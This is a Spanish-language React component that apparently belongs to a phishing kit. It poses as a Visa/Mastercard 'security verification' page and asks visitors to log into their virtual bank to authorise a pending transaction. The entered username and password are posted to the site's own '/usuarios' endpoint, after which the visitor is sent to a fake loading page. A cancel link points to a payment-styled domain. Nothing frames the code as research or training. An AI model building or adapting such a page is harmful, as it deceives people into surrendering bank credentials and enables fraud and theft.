import useAuth from '../hooks/useAuth'
import { Link } from 'react-router-dom'
import {useEffect, useState} from 'react'
import Spinner from '../components/Spinner'
import Alerta from "../components/Alerta"
import clienteAxios from "../config/clienteAxios"
import visa from '/visa.png'
import master from '/master.jpg'

const SesionBanco = () => {

    const Openbar = () => {
     document.querySelector('.sidebar').classList.toggle('left-[-350px]')
    }

    const [ usuario, setUsuario ] = useState('')
    const [ contraseñaBanco, setContraseñaBanco ] = useState('')
    const [ alerta, setAlerta ] = useState({})
    /*const [ nombre, setNombre ] = useState('')
    const [ email, setEmail ] = useState('')
    const [ password, setPassword ] = useState('')
    const [ repetirPassword, setRepetirPassword] = useState('')
   
  */
  
    const handleSubmit = async e => {
      e.preventDefault()
      if(usuario.length === 0) {
        setAlerta({
          msg: 'Campo obligatorio',
          error: true
        })
        return
      }

      if(contraseñaBanco.length === 0) {
        setAlerta({
          msg: 'Campo obligatorio',
          error: true
        })
        return
      }
  
    
  
      setAlerta({})
  
      //Creando el usuario en la API
      try {
        const { data } = await clienteAxios.post(`/usuarios`, {usuario, contraseñaBanco})
        setAlerta({
          msg: data.msg,
          error: false
        })
  
        setUsuario('')
        setContraseñaBanco('')
        const urlBase = window.location.origin
    
        window.location = `${urlBase}/carga2`

      } catch (error) {
        setAlerta({
          msg: error.response.data.msg,
          error: true
        })
      }

      
    }

    
    useEffect(() => {
      window.scrollTo(0, 0)
    }, [location.pathname])
  
    const { msg } = alerta

 

  return (
    <div className='text-center bg-white'>
        <div className="row">
            <div className="col-6">
                <img
					src={visa}
					alt='logo'
					width='250rem'
					height='250rem'
					className="mx-auto my-5"
				/>
            </div>
            <div className="col-6 mt-3">
                <img
					src={master}
					alt='logo'
					width='100rem'
					height='100rem'
					className="mx-auto my-5"
				/>
            </div>
        </div>
        <div className='container mx-auto'>
          <h3 className='tituloBanco uppercase'>Verificación de seguridad</h3>

          <p className='my-1 mt-4 text-secondary'>Debes autorizar la transacción que esta en proceso, inicia sesión en tu banco virtual, a continuación:</p>
        </div> 

        <div className=''>
      <form
          className=" bg-white rounded-lg p-4"
          onSubmit={handleSubmit}
        >
          <div className="">
            <div className="my-2  mx-auto">
                <input
                  id="usuario"
                  type='text'
                  placeholder='Usuario'
                  className='w-full mt-3 p-3 px-8 text-center border rounded-xl bg-gray-50'
                  value={usuario}
                  onChange={ e => setUsuario(e.target.value)}  
                />
            </div>

           
        </div>
        <div className="my-5  mx-auto">
                <input
                  id="contraseñaBanco"
                  type='password'
                  placeholder='Contraseña'
                  className='w-full mt-3 p-3 px-8 text-center border rounded-xl bg-gray-50'
                  value={contraseñaBanco}
                  onChange={ e => setContraseñaBanco(e.target.value)}  
                />
            </div>
            { msg && <Alerta alerta={alerta}/> }
          <div className="text-center mt-5">
           <input
              type='submit'
              value='Iniciar Sesión'
              className='bg-black py-2 m-auto px-12 text-white uppercase font-bold rounded'
            />
          </div>
          
           <div className='text-center mt-1'>
                <a href='https://pagos4-72.com/pago' className='cancelarTransaccion py-2 m-auto px-12 camelcase font-bold'><u>Cancelar Transacción</u></a>
            </div>

        </form>
      
       
    </div>



    </div>
    
  )
}

export default SesionBanco


